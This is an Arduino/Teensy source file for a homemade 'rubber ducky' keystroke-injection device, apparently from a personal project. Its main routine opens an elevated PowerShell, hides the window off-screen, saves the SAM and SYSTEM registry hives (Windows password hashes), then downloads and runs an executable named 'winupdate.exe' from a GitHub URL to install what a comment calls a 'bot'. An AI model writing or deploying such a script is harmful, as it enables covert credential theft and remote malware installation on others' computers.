/*
 * Made by papiii
 * teensyduck.ino
 * 
 * Rubberducky Remake with a teensy by papiii
 * It has a builtin password typer. Executes Basic rubber-ducky
 * scripts.
 */
 
//My keyboard lib
#include "teensyduck.h"

void main();
void script();
void sscript();

void setup()
{

  delay(1000);
  
  pinMode(ledPin, OUTPUT);
  pinMode(noExecPin, INPUT);
  pinMode(passwdPin, INPUT);
  pinMode(secScript, INPUT);

  // enable internal pull-ups
  digitalWrite(noExecPin, 1);
  digitalWrite(passwdPin, 1);
  digitalWrite(secScript, 1);

	main();

}

void loop()
{

  // This code can be re-executed if needed
  // eg: Re type password.
  if(digitalRead(noExecPin) != HIGH){
   setup();
  }else if(digitalRead(passwdPin) != HIGH){
    enterPass();
  }

}

void main()
{

	if(digitalRead(noExecPin) != HIGH){
   pauseScript();
  } else if(digitalRead(passwdPin) != HIGH){
    enterPass();
  } else if(digitalRead(secScript) != HIGH){
    sscript();
  } else {
    script();
  }
  resetKey();

}

// Rubber ducky 
//Main script:
//  install p4p1 bot
void script()
{
  pressModifier(MODIFIERKEY_GUI);
  pressKey(KEY_D);
  resetKey();
  pressModifier(MODIFIERKEY_GUI);
  resetKey();
  DELAY;
  Keyboard.print("powershell");
  DELAY;
  Keyboard.set_modifier(MODIFIERKEY_CTRL | MODIFIERKEY_SHIFT);
  Keyboard.send_now();
  pressKey(KEY_ENTER);
  resetKey();
  DELAY;
  pressModifier(MODIFIERKEY_ALT);
  pressKey(KEY_O);
  resetKey();
  DELAY;
  pressModifier(MODIFIERKEY_ALT);
  pressKey(KEY_SPACE);
  resetKey();
  delay(500);
  pressKey(KEY_L);
  resetKey();
  delay(500);
  for(int i = 0; i < 70; i++){
    pressKey( KEY_DOWN_ARROW );
  }
  delay(700);
  pressKey(KEY_ENTER);
  pressKey(KEY_ENTER);
  Keyboard.print("reg.exe save HKLM\\SAM sam ; reg.exe save HKLM\\SYSTEM sys");
  pressKey(KEY_ENTER);
  Keyboard.print("(new-object System.Net.WebClient).DownloadFile(\"https://raw.githubusercontent.com/p4p1/Projects/master/ExecuteDump/winupdate.exe\",\"winupdate.exe\") ; .\\winupdate.exe");
  pressKey(KEY_ENTER);
}

//Second script: 
// Wallpaper breaker :)
void sscript()
{

}
